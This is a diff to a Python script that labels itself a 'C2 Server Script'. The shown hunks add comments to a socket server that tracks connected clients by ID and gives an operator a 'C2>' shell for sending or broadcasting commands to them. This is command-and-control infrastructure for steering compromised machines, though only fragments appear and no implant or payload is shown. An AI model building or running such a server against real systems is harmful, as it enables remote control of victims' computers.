@@ -1,3 +1,4 @@
+# Matt Sisco - C2 Server Script
 import socket
 import time
 import threading
@@ -29,6 +30,7 @@ def handle_client(client_socket, client_addr, cid):
         client_socket.close()
 
 def broadcast_command(cmd):
+    # Add functionality to send a command to all connected clients
     with lock:
         for cid, client_socket in clients.items():
             try:
@@ -38,6 +40,7 @@ def broadcast_command(cmd):
                 print(f"Error sending to client {cid}: {e}")
 
 def send_command_to_client(cid, cmd):
+    # Add functionality to send a command to a specific client by ID
     with lock:
         client_socket = clients.get(cid)
         if client_socket:
@@ -50,6 +53,7 @@ def send_command_to_client(cid, cmd):
             print(f"No client with ID {cid}")
 
 def list_sessions():
+    # Add functionality to list all active client sessions with their IDs
     with lock:
         if clients:
             print("Active sessions:")
@@ -59,6 +63,7 @@ def list_sessions():
             print("No active sessions.")
 
 def server_shell():
+    # Add an interactive shell for the operator to manage sessions and send commands
     global client_id
     while True:
         cmd = input("C2> ").strip()
@@ -68,7 +73,7 @@ def server_shell():
             try:
                 cid = int(cmd.split()[1])
                 if cid in clients:
-                    print(f"Enter command to send to client {cid}:")
+                    print(f"\nEnter command to send to client {cid}:")
                     while True:
                         sub_cmd = input(f"Client {cid}> ").strip()
                         if sub_cmd == "background":
@@ -81,6 +86,7 @@ def server_shell():
                 print("Invalid command format. Use 'send <client_id> <command>'")
 
         elif cmd.startswith("broadcast "):
+            # Extract the command to broadcast
             command = cmd[10:].strip()
             if command:
                 broadcast_command(command)
@@ -108,6 +114,7 @@ def main():
         global client_id
         try:
             while True:
+                # Accept new client connections
                 client_socket, client_addr = server.accept()
                 with lock:
                     client_id += 1
